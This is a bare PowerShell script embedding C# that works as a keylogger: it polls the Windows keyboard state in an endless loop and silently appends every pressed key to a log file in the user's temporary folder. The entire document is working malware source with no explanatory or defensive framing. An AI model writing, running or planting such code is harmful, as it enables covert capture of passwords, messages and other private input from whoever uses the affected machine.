$logfile = "$env:TEMP\keys.log"
Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class KeyLogger {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
    public static void StartLogging() {
        string path = "$logfile";
        while (true) {
            System.Threading.Thread.Sleep(10);
            for (int i = 8; i <= 255; i++) {
                if (GetAsyncKeyState(i) == -32767) {
                    File.AppendAllText(path, ((Keys)i).ToString() + " ");
                }
            }
        }
    }
}
"@
[KeyLogger]::StartLogging()
